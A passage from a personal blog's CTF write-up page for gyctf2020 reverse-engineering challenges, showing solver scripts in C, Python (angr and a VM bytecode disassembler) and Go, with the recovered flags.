class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    b64 = <span class="built_in">BIO_new</span>(<span class="built_in">BIO_f_base64</span>());</span><br><span class="line">    <span class="built_in">BIO_set_flags</span>(b64, BIO_FLAGS_BASE64_NO_NL);</span><br><span class="line"></span><br><span class="line">    bio = <span class="built_in">BIO_new_mem_buf</span>(in_str, in_len);</span><br><span class="line">    bio = <span class="built_in">BIO_push</span>(b64, bio);</span><br><span class="line"></span><br><span class="line">    size = <span class="built_in">BIO_read</span>(bio, out_str, in_len);</span><br><span class="line">    out_str[size] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">BIO_free_all</span>(bio);</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> text[] = <span class="string">&quot;tiDBHSFrQBlPMzOozx7sQWbo77GjGFH/F4EqZ8R6HuLyb+OQn9pfSCW49GWWRD3b&quot;</span>;</span><br><span class="line">    <span class="type">char</span> chiper[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> key[<span class="number">0x10</span>] = <span class="string">&quot;8ab86b897\0\0\0\0\0\0\0&quot;</span>;</span><br><span class="line">    <span class="type">size_t</span> l = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">base64_decode</span>(text,<span class="built_in">strlen</span>(text),chiper);</span><br><span class="line">    <span class="type">char</span>* plain= <span class="built_in">xxtea_decrypt</span>(chiper,<span class="built_in">strlen</span>(chiper),key,&amp;l);</span><br><span class="line">    <span class="keyword">if</span>(plain==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;Failure!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,plain);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="EasyVM"><a href="#EasyVM" class="headerlink" title="EasyVM"></a>EasyVM</h2><p>简单的VM,直接angr可以解出来:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./EasyVM&#x27;</span>)</span><br><span class="line"></span><br><span class="line">st = proj.factory.entry_state()</span><br><span class="line">sm = proj.factory.simulation_manager(st)</span><br><span class="line">sm.explore(find=<span class="number">0x400b73</span>,avoid=<span class="number">0x400b81</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sm.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line"><span class="comment"># flag&#123;vm_is_not_easy&#125;</span></span><br></pre></td></tr></table></figure>
<p>也可以手撸VM code</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">pc =[<span class="number">0x00000001</span>,<span class="number">0x00000065</span>,<span class="number">0x00000000</span>, <span class="number">0x00000001</span>,</span><br><span class="line"><span class="number">0x00000066</span>,<span class="number">0x000000DC</span>,<span class="number">0x00000002</span>, <span class="number">0x00000065</span>,</span><br><span class="line"><span class="number">0x00000066</span>,<span class="number">0x00000001</span>,<span class="number">0x00000000</span>, <span class="number">0x00000065</span>,</span><br><span class="line"><span class="number">0x00000001</span>,<span class="number">0x00000065</span>,<span class="number">0x00000001</span>, <span class="number">0x00000003</span>,</span><br><span class="line"><span class="number">0x00000065</span>,<span class="number">0x00000000</span>,<span class="number">0x00000001</span>, <span class="number">0x00000001</span>,</span><br><span class="line"><span class="number">0x00000065</span>,<span class="number">0x00000001</span>,<span class="number">0x00000066</span>, <span class="number">0x00000001</span>,</span><br><span class="line"><span class="number">0x00000001</span>,<span class="number">0x00000065</span>,<span class="number">0x00000002</span>, <span class="number">0x00000002</span>,</span><br><span class="line"><span class="number">0x00000065</span>,<span class="number">0x00000066</span>,<span class="number">0x00000005</span>, <span class="number">0x00000065</span>,</span><br><span class="line"><span class="number">0x00000005</span>,<span class="number">0x00000065</span>,<span class="number">0x00000001</span>, <span class="number">0x00000002</span>,</span><br><span class="line"><span class="number">0x00000065</span>,<span class="number">0x00000002</span>,<span class="number">0x00000003</span>, <span class="number">0x00000000</span>,</span><br><span class="line"><span class="number">0x00000002</span>,<span class="number">0x00000003</span>,<span class="number">0x00000002</span>, <span class="number">0x00000005</span>,</span><br><span class="line"><span class="number">0x00000004</span>,<span class="number">0x00000004</span>,<span class="number">0x00000004</span>, <span class="number">0x000000D7</span>,</span><br><span class="line"><span class="number">0x00000001</span>,<span class="number">0x00000066</span>,<span class="number">0x00000005</span>, <span class="number">0x00000001</span>,</span><br><span class="line"><span class="number">0x00000065</span>,<span class="number">0x000000E6</span>,<span class="number">0x00000004</span>, <span class="number">0x00000066</span>,</span><br><span class="line"><span class="number">0x00000065</span>,<span class="number">0x00000001</span>,<span class="number">0x00000005</span>, <span class="number">0x00000066</span>,</span><br><span class="line"><span class="number">0x00000006</span>,<span class="number">0x00000006</span>,<span class="number">0x00000006</span>, <span class="number">0x00000006</span>,</span><br><span class="line"><span class="number">0x00000001</span>,<span class="number">0x00000065</span>,<span class="number">0x00000000</span>, <span class="number">0x00000002</span>,</span><br><span class="line"><span class="number">0x00000007</span>,<span class="number">0x00000065</span>,<span class="number">0x00000003</span>, <span class="number">0x00000008</span>,</span><br><span class="line"><span class="number">0x000000E6</span>,<span class="number">0x00000004</span>,<span class="number">0x00000009</span>, <span class="number">0x000000D2</span>,</span><br><span class="line"><span class="number">0x00000001</span>,<span class="number">0x00000065</span>,<span class="number">0x0000000A</span>, <span class="number">0x00000001</span>,</span><br><span class="line"><span class="number">0x00000066</span>,<span class="number">0x00000009</span>,<span class="number">0x00000003</span>, <span class="number">0x00000065</span>,</span><br><span class="line"><span class="number">0x00000066</span>,<span class="number">0x00000001</span>,<span class="number">0x0000000A</span>, <span class="number">0x00000065</span>,</span><br><span class="line"><span class="number">0x00000006</span>,<span class="number">0x0000000B</span>,<span class="number">0x00000005</span>, <span class="number">0x0000000B</span>,</span><br><span class="line"><span class="number">0x00000006</span>,<span class="number">0x0000000C</span>,<span class="number">0x00000003</span>, <span class="number">0x0000000C</span>,</span><br><span class="line"><span class="number">0x0000000C</span>,<span class="number">0x00000001</span>,<span class="number">0x00000065</span>, <span class="number">0x0000000D</span>,</span><br><span class="line"><span class="number">0x00000001</span>,<span class="number">0x00000066</span>,<span class="number">0x0000000E</span>, <span class="number">0x00000003</span>,</span><br><span class="line"><span class="number">0x00000066</span>,<span class="number">0x00000065</span>,<span class="number">0x00000001</span>, <span class="number">0x0000000E</span>,</span><br><span class="line"><span class="number">0x00000066</span>,<span class="number">0x00000003</span>,<span class="number">0x00000065</span>, <span class="number">0x00000066</span>,</span><br><span class="line"><span class="number">0x00000001</span>,<span class="number">0x0000000D</span>,<span class="number">0x00000065</span>, <span class="number">0x00000001</span>,</span><br><span class="line"><span class="number">0x00000065</span>,<span class="number">0x0000000F</span>,<span class="number">0x00000001</span>, <span class="number">0x00000066</span>,</span><br><span class="line"><span class="number">0x00000010</span>,<span class="number">0x00000003</span>,<span class="number">0x00000066</span>, <span class="number">0x00000065</span>,</span><br><span class="line"><span class="number">0x00000001</span>,<span class="number">0x00000010</span>,<span class="number">0x00000066</span>, <span class="number">0x00000004</span>,</span><br><span class="line"><span class="number">0x00000066</span>,<span class="number">0x00000065</span>,<span class="number">0x00000001</span>, <span class="number">0x0000000F</span>,</span><br><span class="line"><span class="number">0x00000066</span>,<span class="number">0x00000006</span>,<span class="number">0x00000011</span>, <span class="number">0x00000006</span>,</span><br><span class="line"><span class="number">0x00000011</span>,<span class="number">0x00000004</span>,<span class="number">0x00000012</span>, <span class="number">0x000000F0</span>,</span><br><span class="line"><span class="number">0x00000004</span>,<span class="number">0x00000012</span>,<span class="number">0x000000F0</span>, <span class="number">0x000000FF</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getpoint</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0x65</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;r1&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">0x66</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;r2&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;s[%d]&quot;</span>%i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parser</span>():</span><br><span class="line">    opcode = <span class="string">&quot;&quot;</span></span><br><span class="line">    operand = []</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> pc[i]!=<span class="number">0xFF</span>:</span><br><span class="line">        opcode = <span class="string">&quot;&quot;</span></span><br><span class="line">        operand = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> pc[i] == <span class="number">1</span>:</span><br><span class="line">            opcode = <span class="string">&#x27;mov&#x27;</span></span><br><span class="line">            operand.append(getpoint(pc[i+<span class="number">1</span>]))</span><br><span class="line">            <span class="keyword">if</span> pc[i+<span class="number">2</span>]&lt;=<span class="number">0xc7</span>:</span><br><span class="line">                operand.append(getpoint(pc[i+<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                operand.append(<span class="built_in">hex</span>(pc[i+<span class="number">2</span>]+<span class="number">0x38</span>))</span><br><span class="line">            i=i+<span class="number">3</span></span><br><span class="line">        <span class="keyword">elif</span> pc[i] ==<span class="number">2</span>:</span><br><span class="line">            opcode = <span class="string">&#x27;xor&#x27;</span></span><br><span class="line">            operand.append(getpoint(pc[i+<span class="number">1</span>]))</span><br><span class="line">            <span class="keyword">if</span> pc[i+<span class="number">2</span>]&lt;=<span class="number">0xc7</span>:</span><br><span class="line">                operand.append(getpoint(pc[i+<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                operand.append(<span class="built_in">hex</span>(pc[i+<span class="number">2</span>]+<span class="number">0x38</span>))</span><br><span class="line">            i=i+<span class="number">3</span></span><br><span class="line">        <span class="keyword">elif</span> pc[i] ==<span class="number">3</span>:</span><br><span class="line">            opcode = <span class="string">&#x27;add&#x27;</span></span><br><span class="line">            operand.append(getpoint(pc[i+<span class="number">1</span>]))</span><br><span class="line">            <span class="keyword">if</span> pc[i+<span class="number">2</span>]&lt;=<span class="number">0xc7</span>:</span><br><span class="line">                operand.append(getpoint(pc[i+<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                operand.append(<span class="built_in">hex</span>(pc[i+<span class="number">2</span>]+<span class="number">0x38</span>))</span><br><span class="line">            i=i+<span class="number">3</span></span><br><span class="line">        <span class="keyword">elif</span> pc[i] == <span class="number">4</span>:</span><br><span class="line">            opcode = <span class="string">&#x27;sub&#x27;</span></span><br><span class="line">            operand.append(getpoint(pc[i+<span class="number">1</span>]))</span><br><span class="line">            <span class="keyword">if</span> pc[i+<span class="number">2</span>]&lt;=<span class="number">0xc7</span>:</span><br><span class="line">                operand.append(getpoint(pc[i+<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                operand.append(<span class="built_in">hex</span>(pc[i+<span class="number">2</span>]+<span class="number">0x38</span>))</span><br><span class="line">            i=i+<span class="number">3</span></span><br><span class="line">        <span class="keyword">elif</span> pc[i] ==<span class="number">5</span>:</span><br><span class="line">            opcode = <span class="string">&#x27;inc&#x27;</span></span><br><span class="line">            operand.append(getpoint(pc[i+<span class="number">1</span>]))</span><br><span class="line">            i=i+<span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> pc[i] ==<span class="number">6</span>:</span><br><span class="line">            opcode = <span class="string">&#x27;dec&#x27;</span></span><br><span class="line">            operand.append(getpoint(pc[i+<span class="number">1</span>]))</span><br><span class="line">            i=i+<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            opcode = <span class="string">&quot;nop&quot;</span></span><br><span class="line">            i=i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(opcode,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> op <span class="keyword">in</span> operand:</span><br><span class="line">            <span class="built_in">print</span>(op,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">parser()</span><br></pre></td></tr></table></figure>
<p>解出来的opcodes如下</p>
<p>根据这个1byte&#x2F;byte可以解出来flag:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">mov r1 s[0]</span><br><span class="line">mov r2 0x114</span><br><span class="line">xor r1 r2</span><br><span class="line">mov s[0] r1</span><br><span class="line">mov r1 s[1]</span><br><span class="line">add r1 s[0]</span><br><span class="line">mov s[1] r1</span><br><span class="line">mov r2 s[1]</span><br><span class="line">mov r1 s[2]</span><br><span class="line">xor r1 r2</span><br><span class="line">inc r1</span><br><span class="line">inc r1</span><br><span class="line">mov s[2] r1</span><br><span class="line">xor s[3] s[0]</span><br><span class="line">xor s[3] s[2]</span><br><span class="line">inc s[4]</span><br><span class="line">sub s[4] 0x10f</span><br><span class="line">mov r2 s[5]</span><br><span class="line">mov r1 0x11e</span><br><span class="line">sub r2 r1</span><br><span class="line">mov s[5] r2</span><br><span class="line">dec s[6]</span><br><span class="line">dec s[6]</span><br><span class="line">mov r1 s[0]</span><br><span class="line">xor s[7] r1</span><br><span class="line">add s[8] 0x11e</span><br><span class="line">sub s[9] 0x10a</span><br><span class="line">mov r1 s[10]</span><br><span class="line">mov r2 s[9]</span><br><span class="line">add r1 r2</span><br><span class="line">mov s[10] r1</span><br><span class="line">dec s[11]</span><br><span class="line">inc s[11]</span><br><span class="line">dec s[12]</span><br><span class="line">add s[12] s[12]</span><br><span class="line">mov r1 s[13]</span><br><span class="line">mov r2 s[14]</span><br><span class="line">add r2 r1</span><br><span class="line">mov s[14] r2</span><br><span class="line">add r1 r2</span><br><span class="line">mov s[13] r1</span><br><span class="line">mov r1 s[15]</span><br><span class="line">mov r2 s[16]</span><br><span class="line">add r2 r1</span><br><span class="line">mov s[16] r2</span><br><span class="line">sub r2 r1</span><br><span class="line">mov s[15] r2</span><br><span class="line">dec s[17]</span><br><span class="line">dec s[17]</span><br><span class="line">sub s[18] 0x128</span><br><span class="line">sub s[18] 0x128</span><br></pre></td></tr></table></figure>

<h2 id="babymac-re"><a href="#babymac-re" class="headerlink" title="babymac-re"></a>babymac-re</h2><p>看起来像是01背包问题,但好在数据量比较小,爆破可解,为了速度试用go写了一个爆破脚本:</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>(</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;strconv&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = []<span class="type">uint64</span>&#123;<span class="number">1145141919810</span>, <span class="number">11451419198005</span>, <span class="number">88175927824097</span>, <span class="number">59547379826567</span>, <span class="number">85885643980259</span>, <span class="number">111078766210607</span>, <span class="number">34354257570550</span>, <span class="number">4580567632918</span>, <span class="number">4580567587375</span>, <span class="number">56111953885801</span>, <span class="number">73289082498024</span>, <span class="number">6870850780444</span>, <span class="number">17177127320052</span>, <span class="number">73289079912751</span>, <span class="number">4580561769860</span>, <span class="number">75579354889270</span>, <span class="number">65273065791251</span>, <span class="number">13741655762243</span>, <span class="number">54966717600097</span>, <span class="number">104207725601353</span>, <span class="number">112223529937564</span>, <span class="number">40079210785300</span>, <span class="number">96190408447959</span>, <span class="number">27480380444247</span>, <span class="number">106492147280229</span>, <span class="number">56099851547153</span>, <span class="number">44636329825478</span>, <span class="number">101869220767707</span>, <span class="number">41128288922888</span>, <span class="number">67369732888265</span>, <span class="number">11064138437126</span>, <span class="number">26708844553169</span>&#125;</span><br><span class="line"><span class="keyword">var</span> b = []<span class="type">uint64</span>&#123;<span class="number">0x30970372813D2</span>,<span class="number">0x2D3A89BCA52AC</span>,<span class="number">0x31551E79154A2</span>,<span class="number">0x2C522E9A5298A</span>,<span class="number">0x2A61367C5C698</span>,<span class="number">0x264491C01CAFD</span>,<span class="number">0x26CA3A06C98B3</span>,<span class="number">0x2DACBD12FB903</span>,<span class="number">0x2E470707574E1</span>,<span class="number">0x309E5DC39A9A7</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">en</span><span class="params">(d <span class="type">uint64</span>)</span></span> <span class="type">uint64</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> res <span class="type">uint64</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++&#123;</span><br><span class="line">        res += a[<span class="number">31</span>-i]*(d&amp;<span class="number">1</span>)</span><br><span class="line">        d = d&gt;&gt;<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">brute</span><span class="params">(i <span class="type">int</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> a1:=<span class="number">0x20</span>;a1&lt;=<span class="number">0x7F</span>;a1++&#123;</span><br><span class="line">        <span class="keyword">for</span> a2:=<span class="number">0x20</span>;a2&lt;=<span class="number">0x7F</span>;a2++&#123;</span><br><span class="line">            <span class="keyword">for</span> a3:=<span class="number">0x20</span>;a3&lt;=<span class="number">0x7F</span>;a3++&#123;</span><br><span class="line">                <span class="keyword">for</span> a4:=<span class="number">0x20</span>;a4&lt;=<span class="number">0x7F</span>;a4++&#123;</span><br><span class="line">                    dst := fmt.Sprintf(<span class="string">&quot;0x%x%x%x%x&quot;</span>, a1,a2,a3,a4)</span><br><span class="line">                    d,err := strconv.ParseUint(dst, <span class="number">0</span>, <span class="number">32</span>)</span><br><span class="line">                    <span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line">                        <span class="built_in">panic</span>(err)</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> en(d) == b[i]&#123;</span><br><span class="line">                        fmt.Printf(<span class="string">&quot;%s&quot;</span>,<span class="type">string</span>(a4)+<span class="type">string</span>(a3)+<span class="type">string</span>(a2)+<span class="type">string</span>(a1))</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// flag&#123;m3Rkl3_h3LLMaN_KNaPsacK_Al90R17Hm!&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    num := <span class="built_in">len</span>(b)</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;num;i++&#123;</span><br><span class="line">        brute(i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/02/22/2020qyctf/" data-id="cuidzbBL8ZBb5P2Snsh5ZOob9" data-title="gyctf2020" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">November 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">August 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/11/19/ciscn2019%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E5%8C%BA%E5%9F%9F%E8%B5%9B/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/11/19/cakectf2022/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/11/19/2025crewctf/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/11/19/2025%E7%9C%8B%E9%9B%AAkctf/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/11/18/n1ctfjunior-re/">n1ctfjunior-re</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 xrivendell7<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>